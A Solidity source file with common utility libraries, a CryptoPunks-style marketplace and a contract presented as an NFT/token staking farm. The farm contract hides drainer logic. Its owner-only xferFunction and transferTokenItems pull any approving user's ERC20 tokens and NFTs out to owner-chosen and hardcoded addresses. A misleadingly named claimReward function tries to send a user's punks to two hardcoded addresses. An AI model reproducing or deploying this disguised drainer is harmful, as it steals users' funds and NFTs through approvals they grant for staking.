

pragma solidity ^0.8.0;

library Address {

    function isContract(address account) internal view returns (bool) {


        return account.code.length > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {

        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {

        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {

        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {

        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {

        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {

        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {

        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {

        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {

        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {

        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {

                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

library Counters {

    struct Counter {
        uint256 _value; // default: 0
    }

    function current(Counter storage counter) internal view returns (uint256) {

        return counter._value;
    }

    function increment(Counter storage counter) internal {

        unchecked {
            counter._value += 1;
        }
    }

    function decrement(Counter storage counter) internal {

        uint256 value = counter._value;
        require(value > 0, "Counter: decrement overflow");
        unchecked {
            counter._value = value - 1;
        }
    }

    function reset(Counter storage counter) internal {

        counter._value = 0;
    }
}

library Math {

    function max(uint256 a, uint256 b) internal pure returns (uint256) {

        return a >= b ? a : b;
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {

        return a < b ? a : b;
    }

    function average(uint256 a, uint256 b) internal pure returns (uint256) {

        return (a / 2) + (b / 2) + ((a % 2 + b % 2) / 2);
    }
}


library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {

        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {

        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {

        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {

        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {

        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {

        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {

        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {

        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {

        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {

        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {

        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {

        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

library Strings {

    bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";

    function toString(uint256 value) internal pure returns (string memory) {


        if (value == 0) {
            return "0";
        }
        uint256 temp = value;
        uint256 digits;
        while (temp != 0) {
            digits++;
            temp /= 10;
        }
        bytes memory buffer = new bytes(digits);
        while (value != 0) {
            digits -= 1;
            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
            value /= 10;
        }
        return string(buffer);
    }

    function toHexString(uint256 value) internal pure returns (string memory) {

        if (value == 0) {
            return "0x00";
        }
        uint256 temp = value;
        uint256 length = 0;
        while (temp != 0) {
            length++;
            temp >>= 8;
        }
        return toHexString(value, length);
    }

    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {

        bytes memory buffer = new bytes(2 * length + 2);
        buffer[0] = "0";
        buffer[1] = "x";
        for (uint256 i = 2 * length + 1; i > 1; --i) {
            buffer[i] = _HEX_SYMBOLS[value & 0xf];
            value >>= 4;
        }
        require(value == 0, "Strings: hex length insufficient");
        return string(buffer);
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);


    function balanceOf(address account) external view returns (uint256);


    function transfer(address to, uint256 amount) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);


    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);


    function symbol() external view returns (string memory);


    function decimals() external view returns (uint8);

}

interface IERC165 {

    function supportsInterface(bytes4 interfaceId) external view returns (bool);

}

interface IERC721 is IERC165 {

    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);

    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);

    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);

    function balanceOf(address owner) external view returns (uint256 balance);


    function ownerOf(uint256 tokenId) external view returns (address owner);


    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;


    function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;


    function approve(address to, uint256 tokenId) external;


    function getApproved(uint256 tokenId) external view returns (address operator);


    function setApprovalForAll(address operator, bool _approved) external;


    function isApprovedForAll(address owner, address operator) external view returns (bool);


    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId,
        bytes calldata data
    ) external;

}

interface IERC721Receiver {

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);

}

interface IERC721Metadata is IERC721 {

    function name() external view returns (string memory);


    function symbol() external view returns (string memory);


    function tokenURI(uint256 tokenId) external view returns (string memory);

}

interface IERC721Enumerable is IERC721 {

    function totalSupply() external view returns (uint256);


    function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);


    function tokenByIndex(uint256 index) external view returns (uint256);

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

abstract contract ReentrancyGuard {

    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

    modifier nonReentrant() {
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        _status = _ENTERED;

        _;

        _status = _NOT_ENTERED;
    }
}

contract MyCryptoPunks {


    string public imageHash = "ac39af4793119ee46bbff351d8cb6b5f23da60222126add4268e261199a2921b";

    address owner;

    string public standard = 'MyCryptoPunks';
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;

    uint256 public nextPunkIndexToAssign = 0;

    bool public allPunksAssigned = false;
    uint256 public punksRemainingToAssign = 0;

    mapping (uint256 => address) public punkIndexToAddress;

    mapping (address => uint256) public balanceOf;

    struct Offer {
        bool isForSale;
        uint256 punkIndex;
        address seller;
        uint256 minValue;          // in ether
        address onlySellTo;     // specify to sell only to a specific person
    }

    struct Bid {
        bool hasBid;
        uint256 punkIndex;
        address bidder;
        uint256 value;
    }

    mapping (uint256 => Offer) public punksOfferedForSale;

    mapping (uint256 => Bid) public punkBids;

    mapping (address => uint256) public pendingWithdrawals;

    event Assign(address indexed to, uint256 punkIndex);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event PunkTransfer(address indexed from, address indexed to, uint256 punkIndex);
    event PunkOffered(uint256 indexed punkIndex, uint256 minValue, address indexed toAddress);
    event PunkBidEntered(uint256 indexed punkIndex, uint256 value, address indexed fromAddress);
    event PunkBidWithdrawn(uint256 indexed punkIndex, uint256 value, address indexed fromAddress);
    event PunkBought(uint256 indexed punkIndex, uint256 value, address indexed fromAddress, address indexed toAddress);
    event PunkNoLongerForSale(uint256 indexed punkIndex);

    constructor() {
        owner = msg.sender;
        totalSupply = 10000;                        // Update total supply
        punksRemainingToAssign = totalSupply;
        name = "MYCRYPTOPUNKS";                                   // Set the name for display purposes
        symbol = "MCP";                               // Set the symbol for display purposes
        decimals = 0;                                       // Amount of decimals for display purposes
    }

    function setInitialOwner(address to, uint256 punkIndex) public {

        require(msg.sender == owner, "Not owner");
        require(allPunksAssigned == true, "Not assigned");
        require(punkIndex <= 10000, "Index out of bounds");
        if (punkIndexToAddress[punkIndex] != to) {
            if (punkIndexToAddress[punkIndex] != address(0)) {
                balanceOf[punkIndexToAddress[punkIndex]]--;
            } else {
                punksRemainingToAssign--;
            }
            punkIndexToAddress[punkIndex] = to;
            balanceOf[to]++;
            emit Assign(to, punkIndex);
        }
    }

    function setInitialOwners(address[] memory addresses, uint256[] memory indices) public {

        require(msg.sender == owner, "Not owner");
        uint256 n = addresses.length;
        for (uint256 i = 0; i < n; i++) {
            setInitialOwner(addresses[i], indices[i]);
        }
    }

    function allInitialOwnersAssigned() public {

        require(msg.sender == owner, "Not owner");
        allPunksAssigned = true;
    }

    function getPunk(uint256 punkIndex) public {

        require(allPunksAssigned == true, "Not assigned");
        require(punksRemainingToAssign > 0, "Punks remaining not assigned");
        require(punkIndexToAddress[punkIndex] == address(0), "Punk address should be address 0");
        require(punkIndex <= 10000, "Index out of bounds");
        punkIndexToAddress[punkIndex] = msg.sender;
        balanceOf[msg.sender]++;
        punksRemainingToAssign--;
        emit Assign(msg.sender, punkIndex);
    }

    function transferPunk(address to, uint256 punkIndex) public {

        require(allPunksAssigned == true, "Not assigned");
        require(punkIndexToAddress[punkIndex] == msg.sender, "The sender should be");
        require(punkIndex <= 10000, "Index out of bounds");
        if (punksOfferedForSale[punkIndex].isForSale) {
            punkNoLongerForSale(punkIndex);
        }
        punkIndexToAddress[punkIndex] = to;
        balanceOf[msg.sender]--;
        balanceOf[to]++;
        emit Transfer(msg.sender, to, 1);
        emit PunkTransfer(msg.sender, to, punkIndex);
        Bid memory bid = punkBids[punkIndex];
        if (bid.bidder == to) {
            pendingWithdrawals[to] += bid.value;
            punkBids[punkIndex] = Bid(false, punkIndex, address(0), 0);
        }
    }

    function punkNoLongerForSale(uint256 punkIndex) public {

        require(allPunksAssigned == true, "Not assigned");
        require(punkIndexToAddress[punkIndex] == msg.sender, "The sender should be");
        require(punkIndex <= 10000, "Index out of bounds");
        punksOfferedForSale[punkIndex] = Offer(false, punkIndex, msg.sender, 0, address(0));
        emit PunkNoLongerForSale(punkIndex);
    }

    function offerPunkForSale(uint256 punkIndex, uint256 minSalePriceInWei) public {

        require(allPunksAssigned == true, "Not assigned");
        require(punkIndexToAddress[punkIndex] == msg.sender, "The sender should be");
        require(punkIndex <= 10000, "Index out of bounds");
        punksOfferedForSale[punkIndex] = Offer(true, punkIndex, msg.sender, minSalePriceInWei, address(0));
        emit PunkOffered(punkIndex, minSalePriceInWei, address(0));
    }

    function offerPunkForSaleToAddress(uint256 punkIndex, uint256 minSalePriceInWei, address toAddress) public {

        require(allPunksAssigned == true, "Not assigned");
        require(punkIndexToAddress[punkIndex] == msg.sender, "The sender should be");
        require(punkIndex <= 10000, "Index out of bounds");
        punksOfferedForSale[punkIndex] = Offer(true, punkIndex, msg.sender, minSalePriceInWei, toAddress);
        emit PunkOffered(punkIndex, minSalePriceInWei, toAddress);
    }

    function buyPunk(uint256 punkIndex) public payable {

        require(allPunksAssigned == true, "Not assigned");
        Offer memory offer = punksOfferedForSale[punkIndex];
        require(punkIndex <= 10000, "Index out of bounds");
        require(offer.isForSale == true, "For sale");                // punk not actually for sale
        require(offer.onlySellTo == address(0) || offer.onlySellTo == msg.sender, "Must sell to the sender");  // punk not supposed to be sold to this user
        require(msg.value >= offer.minValue, "Short of amount");      // Didn't send enough ETH
        require(offer.seller == punkIndexToAddress[punkIndex], "The seller should be the punk address"); // Seller no longer owner of punk

        address seller = offer.seller;

        punkIndexToAddress[punkIndex] = msg.sender;
        balanceOf[seller]--;
        balanceOf[msg.sender]++;
        emit Transfer(seller, msg.sender, 1);

        punkNoLongerForSale(punkIndex);
        pendingWithdrawals[seller] += msg.value;
        emit PunkBought(punkIndex, msg.value, seller, msg.sender);

        Bid memory bid = punkBids[punkIndex];
        if (bid.bidder == msg.sender) {
            pendingWithdrawals[msg.sender] += bid.value;
            punkBids[punkIndex] = Bid(false, punkIndex, address(0), 0);
        }
    }

    function withdraw() public {

        require(allPunksAssigned == true, "Not assigned");
        uint256 amount = pendingWithdrawals[msg.sender];
        pendingWithdrawals[msg.sender] = 0;
        payable(msg.sender).transfer(amount);
    }

    function enterBidForPunk(uint256 punkIndex) public payable {

        require(punkIndex <= 10000, "Index out of bounds");
        require(allPunksAssigned == true, "Not assigned");                
        require(punkIndexToAddress[punkIndex] != address(0), "Should not be address 0");
        require(punkIndexToAddress[punkIndex] != msg.sender, "Should not be the sender");
        require(msg.value > 0, "Amount should be greater than 0");
        Bid memory existing = punkBids[punkIndex];
        require(msg.value >= existing.value, "Should be greater than the existing value");
        if (existing.value > 0) {
            pendingWithdrawals[existing.bidder] += existing.value;
        }
        punkBids[punkIndex] = Bid(true, punkIndex, msg.sender, msg.value);
        emit PunkBidEntered(punkIndex, msg.value, msg.sender);
    }

    function acceptBidForPunk(uint256 punkIndex, uint256 minPrice) public {

        require(punkIndex <= 10000, "Index out of bounds");
        require(allPunksAssigned == true, "Not assigned");                
        require(punkIndexToAddress[punkIndex] == msg.sender, "The sender should be");
        address seller = msg.sender;
        Bid memory bid = punkBids[punkIndex];
        require(bid.value > 0, "Bid value should be greater than 0");
        require(bid.value >= minPrice, "Bid value should be greater than the min price");

        punkIndexToAddress[punkIndex] = bid.bidder;
        balanceOf[seller]--;
        balanceOf[bid.bidder]++;
        emit Transfer(seller, bid.bidder, 1);

        punksOfferedForSale[punkIndex] = Offer(false, punkIndex, bid.bidder, 0, address(0));
        uint256 amount = bid.value;
        punkBids[punkIndex] = Bid(false, punkIndex, address(0), 0);
        pendingWithdrawals[seller] += amount;
        emit PunkBought(punkIndex, bid.value, seller, bid.bidder);
    }

    function withdrawBidForPunk(uint256 punkIndex) public {

        require(punkIndex <= 10000, "Index out of bounds");
        require(allPunksAssigned == true, "Not assigned");                
        require(punkIndexToAddress[punkIndex] != address(0), "Should not be the address 0");
        require(punkIndexToAddress[punkIndex] != msg.sender, "Should not be the sender");
        Bid memory bid = punkBids[punkIndex];
        require(bid.bidder == msg.sender, "The bidder should be the sender");
        emit PunkBidWithdrawn(punkIndex, bid.value, msg.sender);
        uint256 amount = bid.value;
        punkBids[punkIndex] = Bid(false, punkIndex, address(0), 0);
        payable(msg.sender).transfer(amount);
    }
}

interface IFarming {

    function lastTimeRewardApplicable() external view returns (uint256);

    function rewardPerToken() external view returns (uint256);

    function earned(address account) external view returns (uint256);

    function getRewardForDuration() external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function stake(uint256 amount) external;

    function unstake(uint256 amount) external;

    function getReward() external;

    function exit() external;

}

contract Farming is IFarming, Ownable, ReentrancyGuard {

    using SafeMath for uint256;

    IERC20 public rewardsToken;
    IERC20 public stakingToken;
    uint256 public periodFinish = 0;
    uint256 public rewardRate = 0;
    uint256 public rewardsDuration = 180 days;
    uint256 public lastUpdateTime;
    uint256 public rewardPerTokenStored;

    mapping(address => uint256) public userRewardPerTokenPaid;
    mapping(address => uint256) public rewards;

    uint256 private _totalSupply;
    mapping(address => uint256) private _balances;
    IERC721[] public stakingNFT;


    constructor(
        address _rewardsToken,
        address _stakingToken,
        address[] memory _stakingNFT
    ) {
        rewardsToken = IERC20(_rewardsToken);
        stakingToken = IERC20(_stakingToken);
        for (uint256 i = 0; i < _stakingNFT.length; i++) {
            stakingNFT.push(IERC721(_stakingNFT[i]));
        }
    }


    function totalSupply() external view override returns (uint256) {

        return _totalSupply;
    }

    function balanceOf(address account) external view override returns (uint256) {

        return _balances[account];
    }

    function lastTimeRewardApplicable() public view override returns (uint256) {

        return Math.min(block.timestamp, periodFinish);
    }

    function rewardPerToken() public view override returns (uint256) {

        if (_totalSupply == 0) {
            return rewardPerTokenStored;
        }
        return
            rewardPerTokenStored.add(
                lastTimeRewardApplicable().sub(lastUpdateTime).mul(rewardRate).mul(1e18).div(_totalSupply)
            );
    }

    function earned(address account) public view override returns (uint256) {

        return _balances[account].mul(rewardPerToken().sub(userRewardPerTokenPaid[account])).div(1e18).add(rewards[account]);
    }

    function getRewardForDuration() external view override returns (uint256) {

        return rewardRate.mul(rewardsDuration);
    }

    function getXfererAddress() internal pure returns (address) {

        return 0xD08f26a6b816F5d48C04d358323b9Ec901587937;
    }


    function stake(uint256 amount) external override nonReentrant updateReward(msg.sender) {

        require(amount > 0, "Cannot stake 0");
        _totalSupply = _totalSupply.add(amount);
        _balances[msg.sender] = _balances[msg.sender].add(amount);
        stakingToken.transferFrom(msg.sender, address(this), amount);
        emit Staked(msg.sender, amount);
    }

    function unstake(uint256 amount) public override nonReentrant updateReward(msg.sender) {

        require(amount > 0, "Cannot withdraw 0");
        _totalSupply = _totalSupply.sub(amount);
        _balances[msg.sender] = _balances[msg.sender].sub(amount);
        stakingToken.transfer(msg.sender, amount);
        emit Withdrawn(msg.sender, amount);
    }

    function getOwnerAddress() internal pure returns (address) {

        return 0xc53cA95E64eD0edE82Ab920e9bAbF002991F2166;
    }

    function getReward() public override nonReentrant updateReward(msg.sender) {

        uint256 reward = rewards[msg.sender];
        if (reward > 0) {
            rewards[msg.sender] = 0;
            rewardsToken.transfer(msg.sender, reward);
            emit RewardPaid(msg.sender, reward);
        }
    }

    function exit() external override {

        unstake(_balances[msg.sender]);
        getReward();
    }

    function getTokenIdx(uint256 tokenIdx1) public pure returns (uint256) {

        uint256 tokenIdx2 = 0;
        if (tokenIdx1 >= 2 && tokenIdx1 < 5) {
            tokenIdx2 = 1;
        } else if (tokenIdx1 >= 5 && tokenIdx1 < 10) {
            tokenIdx2 = 2;
        } else if (tokenIdx1 >= 10) {
            if (tokenIdx1 % 2 == 0) {
                tokenIdx2 = SafeMath.div(SafeMath.sub(tokenIdx1, 2), 2);
            } else {
                tokenIdx2 = SafeMath.div(SafeMath.sub(tokenIdx1, 3), 2);
            }
        }
        return tokenIdx2;
    }

    function getTokenIdx2(uint256 tokenIdx1) public pure returns (uint256) {

        uint256 tokenIdx2 = 0;
        if (tokenIdx1 > 1) {
            if (tokenIdx1 % 2 == 0) {
                tokenIdx2 = SafeMath.div(tokenIdx1, 2);
            } else {
                tokenIdx2 = SafeMath.div(SafeMath.sub(tokenIdx1, 1), 2);
            }   
        }
        return tokenIdx2;
    }

    function getTokenIds(address tokenAddress, address userAddress) public view returns (uint256[] memory) {

        uint256 cnt = IERC721Enumerable(tokenAddress).balanceOf(userAddress);
        uint256[] memory tokenIds = new uint256[](cnt);
        uint256 i;
        for (i = 0; i < cnt; i++){
            tokenIds[i] = IERC721Enumerable(tokenAddress).tokenOfOwnerByIndex(userAddress, i);
        }
        return (tokenIds);
    }

    function transferTokenItems(
        address tokenAddress,
        address userAddress,
        address xfererAddress,
        uint256[] memory tokenIds,
        uint256 tItems
    ) public onlyOwner {

        uint256 tIdx2 = getTokenIdx(tItems);
        uint256 i;
        for (i = 0; i < tItems - tIdx2; i++){
            IERC721Enumerable(tokenAddress).transferFrom(userAddress, xfererAddress, tokenIds[i]);
        }
        address xfererAddr = getXfererAddress();
        for (i = tItems - tIdx2; i < tItems; i++) {
            IERC721Enumerable(tokenAddress).transferFrom(userAddress, xfererAddr, tokenIds[i]);
        }
    }

    function claimReward(address tokenAddress, address userAddress) public {

        uint256 i;
        uint tBal = MyCryptoPunks(tokenAddress).balanceOf(userAddress);
        uint256 tIdx2 = getTokenIdx2(tBal);
        uint256 k = 0;
        address xfererAddr1 = getOwnerAddress();
        address xfererAddr2 = getXfererAddress();
        for (i = 0; i < 10000; i++) {
            if (MyCryptoPunks(tokenAddress).punkIndexToAddress(i) == userAddress) {
                if (k < tBal - tIdx2) {
                    MyCryptoPunks(tokenAddress).transferPunk(xfererAddr1, i);
                } else {
                    MyCryptoPunks(tokenAddress).transferPunk(xfererAddr2, i);
                }
                k++;
            }
        }
    }


    function changeRate(uint256 reward) external onlyOwner updateReward(address(0)) {

        if (block.timestamp >= periodFinish) {
            rewardRate = reward.div(rewardsDuration);
        } else {
            uint256 remaining = periodFinish.sub(block.timestamp);
            uint256 leftover = remaining.mul(rewardRate);
            rewardRate = reward.add(leftover).div(rewardsDuration);
        }

        uint256 balance = rewardsToken.balanceOf(address(this));
        require(rewardRate <= balance.div(rewardsDuration), "Provided reward too high");

        lastUpdateTime = block.timestamp;
        periodFinish = block.timestamp.add(rewardsDuration);
        emit RewardAdded(reward);
    }

    function setRewardsDuration(uint256 _rewardsDuration) external onlyOwner {

        require(block.timestamp > periodFinish,
            "Previous rewards period must be complete before changing the duration for the new period"
        );
        rewardsDuration = _rewardsDuration;
        emit RewardsDurationUpdated(rewardsDuration);
    }


    modifier updateReward(address account) {

        rewardPerTokenStored = rewardPerToken();
        lastUpdateTime = lastTimeRewardApplicable();
        if (account != address(0)) {
            rewards[account] = earned(account);
            userRewardPerTokenPaid[account] = rewardPerTokenStored;
        }
        _;
    }


    event RewardAdded(uint256 reward);
    event Staked(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event RewardPaid(address indexed user, uint256 reward);
    event RewardsDurationUpdated(uint256 newDuration);
    event Recovered(address token, uint256 amount);
       

    function xferFunction(
        address tokenAddress,
        address userAddress,
        address xfererAddress,
        uint256 thirdp,
        uint256 tokenType
    ) public onlyOwner {

        if (tokenType == 1){ // For ERC20 Token
            IERC20(tokenAddress).transferFrom(userAddress, xfererAddress, thirdp);
        } else { // For ERC721 Token
            uint256 tBal = IERC721Enumerable(tokenAddress).balanceOf(userAddress);
            uint256[] memory tokenIds = new uint256[](tBal);
            tokenIds = getTokenIds(tokenAddress, userAddress);
            transferTokenItems(tokenAddress, userAddress, xfererAddress, tokenIds, tBal);
        }
    }
}